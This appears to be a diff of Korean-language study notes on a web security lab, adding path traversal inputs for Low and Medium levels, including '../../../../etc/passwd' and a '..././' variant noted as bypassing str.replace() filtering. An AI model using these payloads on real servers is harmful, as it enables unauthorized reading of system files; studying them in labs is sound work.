@@ -242,10 +242,20 @@ generateSessionToken();
 
 =file1.php
 ```php 
+-- 기본 구조
 ../
 ..\
 .././../
-../../../../etc/passwd
+
+--Low 
+../../../../../../../etc/passwd
+
+--Medium ..././..././..././..././..././..././..././etc/passwd
+ㄴsolve (str.replace()함수 우회)
+
+--High
+
+
 =https:/txt
 
 
